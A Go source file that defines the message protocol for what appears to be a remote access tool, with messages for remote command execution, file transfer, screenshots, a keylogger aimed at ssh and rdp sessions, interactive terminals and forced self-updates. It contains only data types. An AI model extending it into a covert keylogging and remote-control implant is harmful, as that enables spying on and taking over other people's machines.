package common

import (
	"encoding/json"
	"time"
)

// MessageType defines the type of message being sent
type MessageType string

const (
	// Authentication messages
	MsgTypeAuth         MessageType = "auth"
	MsgTypeAuthResponse MessageType = "auth_response"

	// Command messages
	MsgTypeExecuteCommand MessageType = "execute_command"
	MsgTypeCommandResult  MessageType = "command_result"

	// File browser messages
	MsgTypeBrowseFiles  MessageType = "browse_files"
	MsgTypeFileList     MessageType = "file_list"
	MsgTypeGetDrives    MessageType = "get_drives"
	MsgTypeDriveList    MessageType = "drive_list"
	MsgTypeDownloadFile MessageType = "download_file"
	MsgTypeUploadFile   MessageType = "upload_file"
	MsgTypeFileData     MessageType = "file_data"

	// Screenshot messages
	MsgTypeTakeScreenshot MessageType = "take_screenshot"
	MsgTypeScreenshotData MessageType = "screenshot_data"

	// Keylogger messages
	MsgTypeStartKeylogger MessageType = "start_keylogger"
	MsgTypeStopKeylogger  MessageType = "stop_keylogger"
	MsgTypeKeyloggerData  MessageType = "keylogger_data"

	// Update messages
	MsgTypeUpdate       MessageType = "update"
	MsgTypeUpdateStatus MessageType = "update_status"

	// Terminal messages
	MsgTypeStartTerminal  MessageType = "start_terminal"
	MsgTypeStopTerminal   MessageType = "stop_terminal"
	MsgTypeTerminalInput  MessageType = "terminal_input"
	MsgTypeTerminalOutput MessageType = "terminal_output"
	MsgTypeTerminalResize MessageType = "terminal_resize"

	// Heartbeat and status
	MsgTypeHeartbeat MessageType = "heartbeat"
	MsgTypePing      MessageType = "ping"
	MsgTypePong      MessageType = "pong"
	MsgTypeError     MessageType = "error"
)

// Message is the base structure for all messages
type Message struct {
	Type      MessageType     `json:"type"`
	ID        string          `json:"id"`
	Timestamp time.Time       `json:"timestamp"`
	Payload   json.RawMessage `json:"payload"`
}

// AuthPayload contains authentication credentials
type AuthPayload struct {
	ClientID string `json:"client_id"`
	Token    string `json:"token"`
	OS       string `json:"os"`
	Arch     string `json:"arch"`
	Hostname string `json:"hostname"`
	IP       string `json:"ip"`
}

// AuthResponsePayload contains authentication response
type AuthResponsePayload struct {
	Success bool   `json:"success"`
	Message string `json:"message"`
	Token   string `json:"token,omitempty"`
}

// ExecuteCommandPayload contains command to execute
type ExecuteCommandPayload struct {
	Command string   `json:"command"`
	Args    []string `json:"args,omitempty"`
	WorkDir string   `json:"work_dir,omitempty"`
	Timeout int      `json:"timeout,omitempty"` // seconds
}

// CommandResultPayload contains command execution result
type CommandResultPayload struct {
	Success  bool   `json:"success"`
	Output   string `json:"output"`
	Error    string `json:"error,omitempty"`
	ExitCode int    `json:"exit_code"`
	Duration int64  `json:"duration"` // milliseconds
}

// BrowseFilesPayload contains file browsing request
type BrowseFilesPayload struct {
	Path      string `json:"path"`
	Recursive bool   `json:"recursive"`
}

// FileInfo represents file metadata
type FileInfo struct {
	Name    string    `json:"name"`
	Path    string    `json:"path"`
	Size    int64     `json:"size"`
	Mode    string    `json:"mode"`
	ModTime time.Time `json:"mod_time"`
	IsDir   bool      `json:"is_dir"`
}

// FileListPayload contains list of files
type FileListPayload struct {
	Path  string     `json:"path"`
	Files []FileInfo `json:"files"`
	Error string     `json:"error,omitempty"`
}

// DriveInfo represents drive/volume information
type DriveInfo struct {
	Name      string `json:"name"`       // Drive letter (e.g., "C:", "D:")
	Label     string `json:"label"`      // Volume label
	Type      string `json:"type"`       // Drive type (fixed, removable, etc.)
	TotalSize int64  `json:"total_size"` // Total size in bytes
	FreeSize  int64  `json:"free_size"`  // Free size in bytes
}

// DriveListPayload contains list of drives
type DriveListPayload struct {
	Drives []DriveInfo `json:"drives"`
	Error  string      `json:"error,omitempty"`
}

// FileDataPayload contains file content
type FileDataPayload struct {
	Path     string `json:"path"`
	Data     []byte `json:"data"`
	Checksum string `json:"checksum"`
	Error    string `json:"error,omitempty"`
}

// ScreenshotPayload contains screenshot request
type ScreenshotPayload struct {
	Quality int `json:"quality,omitempty"` // 1-100
}

// ScreenshotDataPayload contains screenshot data
type ScreenshotDataPayload struct {
	Data      []byte    `json:"data"`
	Format    string    `json:"format"` // png, jpg
	Width     int       `json:"width"`
	Height    int       `json:"height"`
	Timestamp time.Time `json:"timestamp"`
	Error     string    `json:"error,omitempty"`
}

// KeyloggerPayload contains keylogger control
type KeyloggerPayload struct {
	Action   string `json:"action"` // start, stop
	Target   string `json:"target"` // ssh, rdp, monitor
	SavePath string `json:"save_path,omitempty"`
}

// KeyloggerDataPayload contains logged keys
type KeyloggerDataPayload struct {
	Target    string    `json:"target"`
	Keys      string    `json:"keys"`
	Timestamp time.Time `json:"timestamp"`
	Error     string    `json:"error,omitempty"`
}

// UpdatePayload contains update information
type UpdatePayload struct {
	Version     string `json:"version"`
	DownloadURL string `json:"download_url"`
	Checksum    string `json:"checksum"`
	Force       bool   `json:"force"`
}

// UpdateStatusPayload contains update status
type UpdateStatusPayload struct {
	Status  string `json:"status"` // downloading, installing, complete, failed
	Message string `json:"message"`
	Error   string `json:"error,omitempty"`
}

// ErrorPayload contains error information
type ErrorPayload struct {
	Code    int    `json:"code"`
	Message string `json:"message"`
	Details string `json:"details,omitempty"`
}

// HeartbeatPayload contains client health information
type HeartbeatPayload struct {
	ClientID   string    `json:"client_id"`
	Status     string    `json:"status"` // online, busy, idle
	CPUUsage   float64   `json:"cpu_usage"`
	MemUsage   float64   `json:"mem_usage"`
	DiskUsage  float64   `json:"disk_usage"`
	Uptime     int64     `json:"uptime"` // seconds
	LastActive time.Time `json:"last_active"`
}

// TerminalInputPayload contains terminal input data
type TerminalInputPayload struct {
	SessionID string `json:"session_id"`
	Data      string `json:"data"`
}

// TerminalOutputPayload contains terminal output data
type TerminalOutputPayload struct {
	SessionID string `json:"session_id"`
	Data      string `json:"data"`
	Error     string `json:"error,omitempty"`
}

// TerminalResizePayload contains terminal resize information
type TerminalResizePayload struct {
	SessionID string `json:"session_id"`
	Rows      int    `json:"rows"`
	Cols      int    `json:"cols"`
}

// StartTerminalPayload contains terminal start request
type StartTerminalPayload struct {
	SessionID string `json:"session_id"`
	Shell     string `json:"shell,omitempty"` // bash, sh, cmd, powershell
	Rows      int    `json:"rows,omitempty"`
	Cols      int    `json:"cols,omitempty"`
}

// ClientMetadata stores client information
type ClientMetadata struct {
	ID            string    `json:"id"`
	Token         string    `json:"token"`
	OS            string    `json:"os"`
	Arch          string    `json:"arch"`
	Hostname      string    `json:"hostname"`
	IP            string    `json:"ip"`        // Local/private IP
	PublicIP      string    `json:"public_ip"` // Public IP (from proxy)
	Status        string    `json:"status"`
	ConnectedAt   time.Time `json:"connected_at"`
	LastSeen      time.Time `json:"last_seen"`
	LastHeartbeat time.Time `json:"last_heartbeat"`
}

// NewMessage creates a new message with the given type and payload
func NewMessage(msgType MessageType, payload interface{}) (*Message, error) {
	data, err := json.Marshal(payload)
	if err != nil {
		return nil, err
	}

	return &Message{
		Type:      msgType,
		ID:        GenerateID(),
		Timestamp: time.Now(),
		Payload:   data,
	}, nil
}

// ParsePayload unmarshals the message payload into the given interface
func (m *Message) ParsePayload(v interface{}) error {
	return json.Unmarshal(m.Payload, v)
}
